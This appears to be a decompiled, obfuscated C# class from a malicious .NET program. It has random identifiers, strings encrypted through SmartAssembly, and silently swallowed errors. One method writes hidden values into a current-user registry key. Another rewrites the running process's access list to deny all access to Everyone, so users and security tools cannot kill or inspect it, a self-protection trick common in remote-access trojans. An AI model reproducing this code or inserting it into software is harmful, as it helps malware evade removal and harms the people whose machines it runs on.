using System;
using System.Runtime.InteropServices;
using System.Security.AccessControl;
using System.Security.Principal;
using Microsoft.Win32;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;

namespace azCTgkmpGT;

internal sealed class fAyYLEKmguzziO
{
	[NonSerialized]
	internal static GetString getString_0;

	[DllImport("advapi32.dll", SetLastError = true)]
	private static extern bool GetKernelObjectSecurity(IntPtr DuPTqDxNVgZi, int ngcxlhXeyVqrTzfQ, [Out] byte[] OsLrjvOEutB, uint aMghjWjcWMdDAE, out uint cZwcCDYPHxWklT);

	[DllImport("advapi32.dll", SetLastError = true)]
	private static extern bool SetKernelObjectSecurity(IntPtr CoUFdvHjLsn, int RisPrfZSeGsSPTh, [In] byte[] kUFXoFpLFOUGoR);

	[DllImport("kernel32.dll")]
	private static extern IntPtr GetCurrentProcess();

	public void CtPYYpoqtgbv(bool bool_0)
	{
		try
		{
			RegistryKey registryKey = Registry.CurrentUser.CreateSubKey(tEjVFvrPgtsm.OEjiexKEqeO(getString_0(107348268)));
			registryKey.SetValue(tEjVFvrPgtsm.OEjiexKEqeO(getString_0(107348131)), getString_0(107350486));
			registryKey.Close();
		}
		catch
		{
		}
	}

	private RawSecurityDescriptor EYkaSlaoRamJA(IntPtr intptr_0)
	{
		byte[] osLrjvOEutB = new byte[0];
		GetKernelObjectSecurity(intptr_0, 4, osLrjvOEutB, 0u, out var cZwcCDYPHxWklT);
		if ((long)cZwcCDYPHxWklT > 32767L)
		{
			return null;
		}
		if (!GetKernelObjectSecurity(intptr_0, 4, osLrjvOEutB = new byte[cZwcCDYPHxWklT], cZwcCDYPHxWklT, out cZwcCDYPHxWklT))
		{
			return null;
		}
		return new RawSecurityDescriptor(osLrjvOEutB, 0);
	}

	private void KBiaThtJnRryaO(IntPtr intptr_0, RawSecurityDescriptor rawSecurityDescriptor_0)
	{
		byte[] array = new byte[rawSecurityDescriptor_0.BinaryLength];
		rawSecurityDescriptor_0.GetBinaryForm(array, 0);
		SetKernelObjectSecurity(intptr_0, 4, array);
	}

	public void qYaOatAdXoc()
	{
		try
		{
			IntPtr currentProcess = GetCurrentProcess();
			RawSecurityDescriptor rawSecurityDescriptor = EYkaSlaoRamJA(currentProcess);
			rawSecurityDescriptor.DiscretionaryAcl!.InsertAce(0, new CommonAce(AceFlags.None, AceQualifier.AccessDenied, 2035711, new SecurityIdentifier(WellKnownSidType.WorldSid, null), isCallback: false, null));
			KBiaThtJnRryaO(currentProcess, rawSecurityDescriptor);
		}
		catch (Exception)
		{
		}
	}

	static fAyYLEKmguzziO()
	{
		Strings.CreateGetStringDelegate(typeof(fAyYLEKmguzziO));
	}
}
